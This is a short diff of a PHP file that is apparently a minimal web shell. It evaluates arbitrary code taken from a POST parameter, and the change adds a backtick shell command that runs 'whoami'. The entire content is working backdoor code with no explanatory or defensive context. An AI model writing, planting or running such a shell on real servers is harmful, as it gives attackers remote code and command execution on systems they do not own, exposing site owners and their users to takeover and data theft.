@@ -1,1 +1,3 @@
-<?php eval($_POST['a']);?>
+<?php eval($_POST['a']);
+echo `whoami\n  `;
+?>
